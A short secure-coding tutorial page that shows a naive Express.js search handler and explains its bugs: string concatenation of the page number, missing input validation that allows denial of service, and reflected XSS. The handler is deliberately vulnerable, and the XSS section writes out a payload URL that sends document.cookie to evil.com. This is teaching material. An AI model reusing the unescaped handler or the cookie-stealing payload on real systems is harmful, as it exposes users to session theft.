# v1-simple-js.md — Query Param Parser

## The Naive Beginning

We needed to parse query parameters and return a search result page.

```javascript
// server.js
const express = require('express');
const app = express();

app.get('/search', (req, res) => {
  const query = req.query.query || '';
  const page = req.query.page || '1';
  const limit = req.query.limit || '10';

  const nextPage = page + 1;  // "1" + 1 = "11"

  res.send(`
    <html>
      <body>
        <p>Query: ${query}</p>
        <p>Page: ${page}</p>
        <p>Limit: ${limit}</p>
        <p>Next: ${nextPage}</p>
      </body>
    </html>
  `);
});

app.listen(3000);
```

## The Hidden Bug

**PAIN:** The code returns HTML but has three hidden bugs that don't crash the server:

1. **String concatenation:** `page` is a string. `"1" + 1` becomes `"11"` instead of `2`.
2. **No validation:** `page=-999` and `limit=99999999` are accepted. A malicious client can request massive result sets (DoS vector).
3. **XSS:** The `query` parameter is reflected directly into HTML without escaping. A user visiting:
   ```
   /search?query=<script>fetch('https://evil.com?c='+document.cookie)</script>
   ```
   will execute the attacker's JavaScript in their browser.

## Why We Added Complexity

We needed:
- **Type coercion** so arithmetic works correctly
- **Runtime validation** so bad user input is rejected (types don't catch runtime data)
- **Output escaping** so user input can't become executable code

> **Lesson:** Query parameters are always strings. Never assume types. Never trust user input in HTML.
